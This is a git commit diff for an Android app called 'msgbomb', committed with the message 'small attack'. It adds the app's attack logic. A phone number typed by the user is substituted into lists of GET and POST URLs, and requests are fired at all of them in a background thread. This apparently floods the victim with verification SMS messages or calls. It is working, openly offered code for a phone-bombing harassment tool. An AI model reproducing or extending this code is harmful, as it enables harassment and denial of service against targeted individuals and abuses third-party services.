0e12a17e3c78e3e6c16e78ece5beeb2cb02c900b
MangoWang <674925341@qq.com>
2013-12-06 01:30:25 -0800

    小型攻击

--- src/com/example/msgbomb/activity/MyActivity.java
+++ src/com/example/msgbomb/activity/MyActivity.java
@@ -1,39 +1,71 @@
 package com.example.msgbomb.activity;
 
 import android.app.Activity;
+import android.content.Context;
 import android.os.Bundle;
+import android.os.StrictMode;
+import android.text.Editable;
+import android.text.TextWatcher;
+import android.util.Log;
+import android.view.KeyEvent;
 import android.view.View;
 import android.view.animation.Animation;
 import android.view.animation.AnimationUtils;
-import android.widget.Button;
-import android.widget.EditText;
-import android.widget.ImageButton;
-import android.widget.Toast;
+import android.view.inputmethod.InputMethodManager;
+import android.widget.*;
 import com.example.msgbomb.R;
-
+import com.example.msgbomb.service.HttpService;
 import java.util.regex.Matcher;
 import java.util.regex.Pattern;
 
 public class MyActivity extends Activity {
     private EditText e_phoneNumber;
     private ImageButton b_attack;
+    private static String[] getUrls;
+    private static String[] postUrls;
     /**
      * Called when the activity is first created.
      */
     @Override
     public void onCreate(Bundle savedInstanceState) {
 
-
         super.onCreate(savedInstanceState);
         setContentView(R.layout.main);
         e_phoneNumber = (EditText) findViewById(R.id.e_phoneNumber);
         b_attack = (ImageButton) findViewById(R.id.b_attack);
+        getUrls = getResources().getStringArray(R.array.get);
+        postUrls = getResources().getStringArray(R.array.post);
+        //StrictMode.ThreadPolicy policy = new StrictMode.ThreadPolicy.Builder().permitAll().build();
+        //StrictMode.setThreadPolicy(policy);
+        e_phoneNumber.addTextChangedListener(new TextWatcher() {
+            @Override
+            public void beforeTextChanged(CharSequence s, int start, int count, int after) {
+
+            }
+
+            @Override
+            public void onTextChanged(CharSequence s, int start, int before, int count) {
+                String num = e_phoneNumber.getText().toString();
+                if(num.length() >= 11 && validateNum(num) ){
+                    InputMethodManager imm = (InputMethodManager)getSystemService(Context.INPUT_METHOD_SERVICE);
+                    if (imm.isActive()) {
+                        imm.toggleSoftInput(InputMethodManager.SHOW_IMPLICIT, InputMethodManager.HIDE_NOT_ALWAYS);
+                    }
+                }
+            }
+
+            @Override
+            public void afterTextChanged(Editable s) {
+
+            }
+        });
         b_attack.setOnClickListener(new View.OnClickListener() {
             @Override
             public void onClick(View v) {
-                boolean isSuitedNum = validateNum(e_phoneNumber.getText().toString());
+                String num = e_phoneNumber.getText().toString();
+                boolean isSuitedNum = validateNum(num);
                 if(isSuitedNum){
-                    attack();
+                    attack(num);
                 }else{
 
                 }
@@ -41,10 +73,15 @@ public class MyActivity extends Activity {
         });
     }
 
-    public void attack(){
-
+    public void attack(final String num){
         //先执行后台逻辑再跑动画
-        startAnimation(b_attack, R.anim.bombing);
+        myStartAnimation(b_attack, R.anim.bombing);
+        new Thread(new Runnable() {
+            @Override
+            public void run() {
+                phone(num);
+            }
+        }).start();
     }
 
     public boolean validateNum(String num){
@@ -69,27 +106,49 @@ public class MyActivity extends Activity {
         }
     }
 
-    public void startAnimation(View v,int id){
+    public void myStartAnimation(View v,int id){
         Animation bombing = AnimationUtils.loadAnimation(this,id);
         if(bombing != null){
             bombing.setAnimationListener(new Animation.AnimationListener() {
                 @Override
                 public void onAnimationStart(Animation animation) {
-                    bombToast("fighting...",false);
+                    //bombToast("fighting...",false);
                 }
 
                 @Override
                 public void onAnimationEnd(Animation animation) {
-                    bombToast("end",false);
+                    //bombToast("end",false);
                 }
 
                 @Override
                 public void onAnimationRepeat(Animation animation) {
-                    bombToast("Repeat",false);
+                    //bombToast("Repeat",false);
                 }
             });
         }
         v.startAnimation(bombing);
+    }
+
+    public void phone(String num) {
+
+        for (int i = 0; i < getUrls.length; i ++) {
+            String u = getUrls[i];
+            String t = u.replace("{tel}", num);
+            String s = HttpService.sendGet(t);
+        }
+
+        for (int i = 0; i < postUrls.length; i ++) {
+            String u = postUrls[i];
+            String t = u.replace("{tel}", num);
+            String [] args = t.split(" ");
+            String returnInfo;
+            if(args.length == 1){
+                returnInfo =  HttpService.sendPost(args[0],null);
+                return;
+            }
+            returnInfo = HttpService.sendPost(args[0], args[1]);
+        }
 
     }
+
 }
--- src/com/example/msgbomb/service/HttpService.java
+++ src/com/example/msgbomb/service/HttpService.java
@@ -1,9 +1,9 @@
 package com.example.msgbomb.service;
 
-import java.io.BufferedReader;
-import java.io.IOException;
-import java.io.InputStreamReader;
-import java.io.PrintWriter;
+import android.util.Log;
+
+import java.io.*;
+import java.net.HttpURLConnection;
 import java.net.URL;
 import java.net.URLConnection;
 import java.util.List;
@@ -48,7 +48,7 @@ public class HttpService {
                 result += line;
             }
         } catch (Exception e) {
-            System.out.println("发送GET请求出现异常！" + e);
+            Log.d("---发送GET请求出现异常---", e.toString());
             e.printStackTrace();
         }
         // 使用finally块来关闭输入流
@@ -78,21 +78,26 @@ public class HttpService {
         BufferedReader in = null;
         String result = "";
         try {
-            URL realUrl = new URL(url);
+             URL realUrl = new URL(url);
             // 打开和URL之间的连接
-            URLConnection conn = realUrl.openConnection();
+            HttpURLConnection conn = (HttpURLConnection) realUrl.openConnection();
             // 设置通用的请求属性
             conn.setRequestProperty("accept", "*/*");
             conn.setRequestProperty("connection", "Keep-Alive");
             conn.setRequestProperty("user-agent",
                     "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.4 (KHTML, like Gecko) Chrome/22.0.1229.79 Safari/537.4");
+            conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
+            conn.setRequestMethod("POST");
             // 发送POST请求必须设置如下两行
             conn.setDoOutput(true);
             conn.setDoInput(true);
             // 获取URLConnection对象对应的输出流
             out = new PrintWriter(conn.getOutputStream());
+
             // 发送请求参数
-            out.print(param);
+            if(param != null){
+                out.print(param);
+            }
             // flush输出流的缓冲
             out.flush();
             // 定义BufferedReader输入流来读取URL的响应
@@ -103,7 +108,7 @@ public class HttpService {
                 result += line;
             }
         } catch (Exception e) {
-            System.out.println("发送 POST 请求出现异常！"+e);
+            Log.d("---发送POST请求出现异常！---", e.toString());
             e.printStackTrace();
         }
         //使用finally块来关闭输出流、输入流
